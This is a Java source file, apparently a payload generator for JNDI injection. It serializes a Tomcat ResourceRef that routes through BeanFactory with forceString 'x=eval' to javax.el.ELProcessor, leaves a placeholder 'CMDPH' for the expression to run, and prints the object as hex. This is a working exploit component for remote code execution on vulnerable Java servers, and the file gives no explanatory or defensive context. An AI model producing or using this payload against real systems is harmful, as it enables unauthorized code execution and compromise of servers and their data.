import javax.naming.Reference;
import org.apache.naming.ResourceRef;
import java.io.*;

public class GenRef {
    public static void main(String[] a) throws Exception {
        ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true,
                "org.apache.naming.factory.BeanFactory", null);
        ref.add(new javax.naming.StringRefAddr("forceString", "x=eval"));
        ref.add(new javax.naming.StringRefAddr("x", "CMDPH"));
        ByteArrayOutputStream bo = new ByteArrayOutputStream();
        new ObjectOutputStream(bo).writeObject(ref);
        StringBuilder sb = new StringBuilder();
        for (byte b : bo.toByteArray()) sb.append(String.format("%02x ", b));
        System.out.println(sb);
    }
}
